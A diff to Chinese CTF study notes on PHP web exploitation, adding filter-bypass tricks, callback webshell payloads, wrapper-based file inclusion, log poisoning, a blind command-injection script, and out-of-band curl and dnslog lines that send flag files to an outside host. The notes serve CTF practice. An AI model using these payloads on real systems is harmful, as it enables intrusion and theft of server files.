@@ -62,18 +62,75 @@ php$ //结尾匹配 如aaaphp
 ```php
 echo str_repeat('very', '250000').'36Dctfshow';
 ```
+4.命名空间绕过
+php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法
+如限制函数开头不能有字母和数字，可用\phpinfo()绕过
 
-## ereg()
+5.无字母数字
+a.eval php7以上
+返回字符串中代码的返回值
+原理：eval("('phpinfo')();");
+```php
+//限制v1,v2为数字，v3无数字和字母，参见p牛博客
+eval("return $v1$v3$v2;");
+//1-phpinfo()-1;
+//1^('system')('cat f*')^1;//高版本
+```
+* 位运算
+可用的运算符:&,|,~,^
+```c
+//v2=^(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa^%96%89)^ //v2=|(~%8c%86%8c%8b%9a%92)(~%93%8c)|
+//c=('``````'|'%13%19%13%14%05%0d')('``'|'%0c%13')
+```
+![20220608232028](https://s2.loli.net/2022/06/08/XjDzQf61uVPAaHe.png)
+[生成脚本](https://blog.csdn.net/miuzzx/article/details/108569080)
+* 自增 'Y'=>'Z'=>'AA'
+b.system
+* shell下可以利用.来执行任意脚本(任意后缀名如txt)，如当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令，且不需要file有x权限
+Linux文件名支持用glob通配符代替
+
+发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。
+随便向一个php里post都可以，它会被保存在tmp那个目录(任何程序都可写)。每次执行完脚本会清空tmp
+执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符,/tmp/phpXXXXXX可以表示为/*/?????????或/???/?????????
+但能够匹配上/???/?????????这个通配符的文件有很多，若在执行第一个匹配上的文件的时候出现错误，会导致整个流程停止，根本不会执行到我们上传的文件。
+但所有文件名都是小写，只有PHP生成的临时文件包含大写字母。可以利用[@-[]来表示大写字母，替代要匹配的那个?
+当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。(repeater多点几次，多生成些随机文件)
+
+* `$(command)` 返回command这条命令的stdout（可嵌套）
+```bash
+$(()) #0
+~$(()) #~0
+$((~$(()))) #-1
+$(($((~$(())))+$((~$(()))))) #-2
+$((~$(($((~$(())))+$((~$(()))))))) #2
+```
+
+6.下划线限制绕过
+PHP接收参数时，发现表单名中如果是 句号(.)或者空格( )，会被转换成下划线(_) 
+解决方法：
+```php
+A[W.C //A_W.C
+```
+## ereg(),eregi()
 绕过：ereg()函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数
+注意在PHP7已废用
+```php
+eregi(正则表达式，匹配字符串)//不区分大小写
+如ereg ("^[a-zA-Z0-9]+$",$_GET['password'])限制了password的形式，只能是一个或者多个数字、大小写字母，可以使用%00截断正则匹配。password=1e8%00*-*
+如eregi("111".substr($b,0,1),"1114")可令$b=.或$b=%00
+```
 
 ## highlight_file
 用绝对路径和相对路径../和./绕过，得到文件包含
 `$_SERVER`参数会自动加上HTTP_
 文件上传时可以用show_source(__FILE__);看上传成功没有
 
-## file_put_contents
-看file_put_contens的文档即可发现，函数第二个允许传入数组，将被连接为字符串再写入
+## file_put_contents(文件名，内容)
+1.函数第二个允许传入数组，将被连接为字符串再写入
 ![20220530162849](https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png)
+注意会覆盖原文件内容，有时要想好再写
+2.文件名可以是index.php
+
 
 ## in_array()
 ```php
@@ -88,30 +145,88 @@ is_numeric("0x123");//php7以后为false,以前为true
 ```
 2.在数字前加上空格，也会被is_numeric函数认为是数字
 ```php
-%0c=>\f
-trim函数会过滤空格以及\n\r\t\v\0，但不会过滤\f
+trim函数会过滤空格以及\n\r\t\v\0，但不会过滤\f=>%0c
 is_numeric("%0c36") //true
 ```
 数值->非数值的绕过:
 可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以；%20加在数值末尾也可以绕过
 ## is_file
 绕过：利用函数所能处理的长度限制进行目录溢出。从而让is_file认为不是一个文件
+## 回调函数
+调用的函数还可以嵌套回调函数
+```php
+//单参数回调
+call_user_func(函数,参数)//可无参数或一参数 
+//可调用此文件及库文件定义好的函数(默认有hex2bin,bin2hex等字符串和16进制转换可用)
+call_user_func_array(数组,函数)//第二个参数可以传入参数列表组成的数组
+//数组操作 单参数
+array_filter(数组,函数)//将数组中所有元素遍历并用指定函数处理过滤用的
+array_map(函数,数组)//一样
+register_shutdown_function(函数, $_REQUEST['pass']);
+register_tick_function (函数, $_REQUEST['pass']);
+filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
+filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));//php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。
 
-## call_user_func(函数，参数)
-可调用此文件定义好的函数(默认有hex2bin,bin2hex等字符串和16进制转换可用)
+//php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition =>有两个参数的回调函数
+uasort(array('test', $_REQUEST['pass']),函数);
+uksort(array('test', $_REQUEST['pass']),函数);
+//面向对象
+$arr = new ArrayObject(array('test', $_REQUEST['pass']));
+$arr->uasort('assert');
 
+array_reduce(array(1), fun, $_POST['pass']);
+array_udiff(array($_POST['pass']), array(1), fun);
+
+//三参数回调
+php中，可以执行代码的函数：
+一个参数：assert
+两个参数：assert （php5.4.8+）
+三个参数：preg_replace /e模式
+mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
+preg_filter('|.*|e', $_REQUEST['pass'], '');
+
+array_walk(array($_POST['pass'] => '|.*|e',), $_REQUEST['e'], '');//?e=preg_replace
+array_walk_recursive(array($_POST['pass'] => '|.*|e',), $_REQUEST['e'], '')
+```
+## 无参函数
+限制传输进参数的函数名必须是字母函数且不能有参数
+```php
+eval("return $f1($f2());");//fuzzing
+```
 ## parse_str
 ```php
 parse_str("name=Peter&age=43",$myArray);//Array ( [name] => Peter [age] => 43 )
 ```
-## eregi、ereg
-注意在PHP7已废用
+## eval,assert
+题目给了`eval("$c")`,构造`$c`的方法：
 ```php
-eregi(正则表达式，匹配字符串)//不区分大小写
-如ereg ("^[a-zA-Z0-9]+$",$_GET['password'])限制了password的形式，只能是一个或者多个数字、大小写字母，可以使用%00截断正则匹配。password=1e8%00*-*
-如eregi("111".substr($b,0,1),"1114")可令$b=.或$b=%00
+1.echo/var_dump/print $flag/$GLOBALS;
+2.highlight_file/show_source("flag.php");
 ```
 
+![20220602121923](https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png)
+## base_convert(number,frombase,tobase);
+frombase和tobase介于 2 和 36 之间（包括 2 和 36）
+```php
+常用base_convert(37907361743,10,36); //但会转换小写和去掉特殊符号，所以常配合hex2bin等使用
+```
+## 魔术方法
+```php
+class_exists($class)//判断类是否存在,当类不存在时会调用__autoload(),尝试加载未定义的类
+```
+## 匿名函数
+[参考](https://my.oschina.net/huyex/blog/2885273)
+```php
+$ctfshow('',$_GET['show']);//可以控制函数名和第二个参数
+creat_function(string $agrs,string $code)
+//string $agrs	声明的函数变量部分
+//string $code	执行的方法代码部分
+$newfunc = create_function('$fname', 'echo $fname."Zhang"')
+但实际会编译成
+function fT($fname) {
+  echo $fname."Zhang";
+}//可实现注入 id=}phpinfo();/* 一定要用多行注释
+```
 # 三、字符串
 ## strpos
 strpos() 函数是区分大小写的。
@@ -120,6 +235,7 @@ strpos() 函数是区分大小写的。
 `if(!strpos($num, "0"))`
 2.大小写
 3.目录穿越
+4.数组
 ```php
 if(stripos($f, 'ctfshow')>0){
         echo readfile($f);
@@ -138,12 +254,6 @@ strtr(string,from,to)
 strtr(string,array)
 $arr = array("Hello" => "Hi", "world" => "earth");
 ```
-## 表单
-PHP接收参数时，发现表单名中如果是 句号(.)或者空格( )，会被转换成下划线(_) 
-解决方法：
-```php
-A[W.C //A_W.C
-```
 
 # 四、md5、sha1
 ## 弱类型比较
@@ -157,7 +267,7 @@ md5('240610708') ==
 md5传入数组会返回NULL
 [1] !== [2] && md5([1]) === md5([2])
 
-# 五、运算符优先级
+# 五、运算符
 ## and
 AND运算符和&&运算符的根本区别在于它们的优先级差异，但两者都执行相同的操作。
 第一个表达式，`$bool = TRUE && FALSE`; 计算结果为FALSE，因为执行了第一个&&操作，然后将结果赋值给变量`$bool`，因为&&运算符的优先级高于=的优先级。
@@ -168,7 +278,17 @@ AND运算符和&&运算符的根本区别在于它们的优先级差异，但两
 A && B || C //可不管A,B,只保证C为true
 ```
 
-# 六、内置类
+# 六、类
+魔术方法
+静态方法：不用实例化可以直接调用
+调用方法：
+```php
+call_user_func($_POST['ctfshow']);
+1.ctfshow::getFlag()
+2.ctfshow[0]=ctfshow&ctfshow[1]=getFlag//过滤冒号
+```
+
+## 内置类
 1.反射类
 ```php
 eval("echo new $v1($v2());");
@@ -186,7 +306,9 @@ $iterator = new FilesystemIterator('.'); // 创建当前目录的迭代器,默�
 getcwd()//获取当前工作目录
 ```
 
-# 七、伪协议
+# 七、伪协议(文件包含)
+?file=php://
+fuzz一下所有的伪协议
 ```php
 include($_GET["file"]);//php://input读取post的data的内容作为文件
 php://filter/read=convert.base64-encode/resource=/flag
@@ -197,10 +319,18 @@ php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
 php://filter/read=convert.quoted-printable-encode/resource=flag.php
 若php://在黑名单：
 compress.zlib://flag.php
+file:///
+dict://
+sftp://
+ldap://
+tftp://
+gopher://
+data:text/plain,<?php phpinfo();?> //可去掉双斜杠
 ```
 ![20220530222004](https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png)
 
-# 八、全局变量
+# 八、变量
+## 全局变量
 flag In the variable 
 ```php
 eval("var_dump($$args);");//?args=GLOBALS
@@ -210,14 +340,6 @@ _()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展�
 call_user_func(call_user_func(_,"get_defined_vars"));
 _("get_defined_vars")=get_defined_vars
 call_user_func(get_defined_vars)
-```
-
-# 其他
-## 题目给了`eval("$c")`
-构造`$c`的方法：
-```php
-1.echo/var_dump/print $flag/GLOBALS;
-2.highlight_file/show_source("flag.php");
 ```
 ## $_SERVER
 ```php
@@ -244,14 +366,157 @@ if($F = @$_GET['F']){
 ``是shell_exec()函数的缩写
 先进行substr()函数截断然后去执行eval()函数,即eval("`$F`;空格")
 而$F就是我们输入的`$F`;空格sleep 3
-即最终效果是eval(`sleep 3`);//注意sleep 3是shell命令，不会在网站显示，所以需要OOB
+即最终效果是eval(`sleep 3`);//注意eval(``),exec,system是shell命令，而且只能输入shell命令，不会在网站显示,system成功则返回命令输出的最后一行
+//解决方法
+//1.oob
+//2.写入文件，用>或|tee
+//3.命令盲注 //.被过滤
 ```
+# 九、命令执行
+`system($c)`会有回显，只是phpstudy无法显示
+```bash
+#php函数
+include|require
+system|exec|passthru|shell_exec #exec("cat /f149_15_h3r3|tee 1");
+#命令行命令
+bash|sh
+nc|netcat|wget|curl|ping
+cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head|nl
+```
+已知flag在flag.php里
 ```php
-?F=`$F`;+curl -X POST -F xx=@flag.php  http://生成的域名
-//xx是上传文件的name值，可随便写。flag.php就是上传的文件,前面要加@表示是文件 
+1.注释，如`$v2=/*,$v3=*/` 
+2.命令分隔符;如system($c." >/dev/null 2>&1");
+还可以用&&,||,&执行前一条命令,如ls||tac
+|执行后一条命令
+记得特殊符号要url编码
+3.过滤flag等关键字
+可用通配符*?[]等代替，cat f*代替,
+或eval(echo `n''l fl''ag.ph''p`);//两引号分隔在shell中执行会自动忽略
+技巧:用tac而不是cat可以不用查看源代码，因破坏了php格式
+4.过滤system等可用``代替，eval,``相当于把数据段""变成了代码段
+5.过滤空格的代替：
+print或echo`cat f*` //echo之间不用加空格
+换行符：\n=>%0a //echo%0a`不可用%0a`
+回车：\r=>%0d //echo%0d`不可用%0d`
+水平制表符:\t=>%09 //`可用`
+垂直制表符：\v=>%0b // echo%0b`不可用%0b`
+特殊零字符，也可以表示NULL值:\0=>%00
+换页键:\f=>%0c //echo%0c`不可用%0c`
+重定向读取如`nl<fla''g.php||` //注意不支持通配符
+没过滤`$`的话可用tac${IFS}flag.txt
+6.参数逃逸 --有很多限制时可以试试
+eval($c);//对$c做了限制
+$c=eval($_GET[1]);//构造不受限的参数1
+$_GET{abs};
+7.过滤括号和分号
+a.使用包含:c=require或include%0a$_GET[1]?>&1=php:// //过滤),(,;
+//最后一句可不用分号,但这样的话必须有闭合标签才行
+//eval等函数的括号可以不闭合，只需令c=phpinfo()?>
+实际效果：
+<?php
+eval("('phpinfo')()?>");
+
+b.使用语言结构:echo print isset unset $_GET[1]
+8.c=show_source(next(array_reverse(scandir(pos(localeconv())))));//不过滤括号和分号时的通解
+localeconv()//函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. =>为了拿到.
+pos()/current()//函数返回数组第一个值 =>拿到.
+scandir(".")//这个函数的作用是扫描当前目录
+//顺序是array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(7) "flag.py" [3]=> string(9) "index.php" }
+array_reverse()//数组颠倒
+next()//将数组指针一项下一位
+show_source()//读取函数内容
+9. c=session_start();system(session_id());
+PHPSESSID=ls
+10.c=eval(pos(next(get_defined_vars())));//注意必须要有2个eval
+post:1=phpinfo();//实现参数逃逸到POST
+11.过滤引号
+$_GET[a]字母是可以不加引号的
+12.位运算构造绕过正则,但要在eval等能执行php代码的函数里面才能执行位运算，system不行
+13.通过重命名或复制绕过文件读取(注意要有权限)
+cp flag.php a.txt//再访问a.txt
+14.通过phpinfo查看禁用函数，再fuzz。(参数逃逸无效，因禁用是全局的)
+文件读取函数：readfile,file_get_content,highlight_file,show_source
+目录搜索：var_dump(scandir('.'))
+文件包含+伪协议或$flag：include,require($_GET[1]) 
+执行shell命令：exec,system,shell_exec,passthru
+包含后读取变量：echo $flag;var_dump(get_defined_vars()/$GLOBALS)
+重命名和复制：rename,copy
+15.缓冲区替换绕过：
+$s = ob_get_contents();//output buffer
+ob_end_clean();
+echo preg_replace("/[0-9]|[a-z]/i","?",$s);
+绕过方法：
+中断:exit,die
+16.glob协议进行目录扫描(遇到权限限制open_basedir restriction时)
+c=$a="glob:///*.txt";//定义路径
+if($b=opendir($a)){
+    while(($file=readdir($b))!==false){//如果它不是目录
+        echo "filename:".$file."\n";
+    }
+    closedir($b);
+}
+uaf脚本绕过安全目录(利用php的垃圾回收机制漏洞)(记得url编码)
+17.调用其他应用如mysql来访问文件
+c=try {
+    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
+    foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}
+    catch (PDOException $e) {echo $e->getMessage();exit(0);}
+    exit(0);
+18.蚁剑绕过disabled functions
+19.FFI，php7.4以上才有
+$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
+$a='/readflag > 1.txt';//没有回显的
+$ffi->system($a);//通过$ffi去调用system函数
+20.环境变量取字母拼接命令
+//$PATH最后一位是n：/bin
+${PATH:~0}
+${PATH:~A}//0和字母均代表最后一位
+//$PWD最后一位是l:/var/www/html
+${HOME}
+${PATH:~A}${PWD:~A}${IFS}????.???//flag.php
+${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}//3
+${PHP_CFLAGS:3:3}//cat
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
+$? //上一次执行的命令，1为不正常，0为正常
+<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???#可能存在成功的机会，不断刷新
 ```
-![20220602121923](https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png)
-# 文件上传
+![20220608021618](https://s2.loli.net/2022/06/08/tnSLOwqyuvQXAl7.png)
+
+## 命令盲注
+脚本：
+```py
+import requests
+import time
+import string
+str=string.digits+string.ascii_lowercase+"-"
+result=""
+key=0
+for j in range(1,45):
+    #print(j)
+    if key==1:
+        break
+    for n in str:
+        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
+        url="http://5fd5973f-3879-413f-9bfc-f3913f618e5f.challenge.ctf.show/?c="+payload
+        try:
+            requests.get(url,timeout=(2.5,2.5))
+        except:
+            result=result+n
+            print(result)
+            break
+```
+## oob
+```php
+1.?F=`$F`;+curl -X POST -F xx=@flag.php  http://生成的域名
+//xx是上传文件的name值，可随便写。flag.php就是上传的文件,前面要加@表示是文件
+2.?F=`$F`;+curl  http://requestbin.net/r/1puo0jq1?p=`cat test.php` 
+3.ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
+nl flag.php|awk "NR==16"|tr -cd "[a-z]"/"[0-9]"//注意前面会有行号
+awk //选择行
+tr //选择符合正则表达式的输出，过滤{},-等特殊符号
+```
+# 十、文件上传
 一句话木马：
 ```php
 eval("echo%20phpinfo();");//注意eval里一定要有引号和分号结束，以及echo不能再接引号了，否则要转义
@@ -294,12 +559,45 @@ $a();
 6.system,wget,nc,exec,passthru,netcat,curl 
 ```php
 curl `cat flag.php|grep "flag"`.当时创建的域名 //dnslog
-
 ```
+## 文件包含绕过
+有?file=upload.php的
+直接访问图片是没用的。菜刀连接的url要包含?file=才行
+1.文件包含不管后缀名是什么，只要含有<?php 内容即可,所以可配合图片马(包含可以解析出来)或.log
+2.phar能把压缩文件解压读取，即使这个压缩文件的后缀名改了也可以。所以上传一个getshell的压缩文件，后缀名改成jpg或者其他。然后通过phar://读取
+```php
+1.test.php
+2.压缩后改后缀名为jpg
+3.include("zip://t.zip#t.php");
+或include("phar://a.phar/a.php");
+```
+## 非预期绕过
+把一句话写到访问日志里面
+使用条件:post提交ctf=/etc/passwd,有回显,我们可以日志文件包含还有session包含(如果clean up开启就不行,需要条件竞争 )
+```php
+include($ctf);
+先在User-Agent注入php代码//只有一次机会
+ctf=/var/log/nginx/access.log   ctf=/var/log/apache/access.log
+```
+![20220607212037](https://s2.loli.net/2022/06/07/kMV7Hl6ONaWYJDU.png)
+![20220607212052](https://s2.loli.net/2022/06/07/OL675yudzZkmgXa.png)
 
-# 命令执行
-1.注释，如`$v2=/*,$v3=*/` 
-2.命令分隔符;
+# 十一、文件包含
+常用包含/etc/passwd来查看回显
+# 十二、反序列化
+序列化只保留成员变量不保留函数方法，所以修改也只能修改变量
+```php
+O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxa";s:5:"isVip";b:1;}
+```
+1.重新构造一个同名相似类，覆盖掉一些特征
+```php
+public $isVip=true;
+echo urlencode(serialize(new ctfShowUser));
+```
+# 其他
+
 
 ---
 
+# 参考
+1.[p神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list)
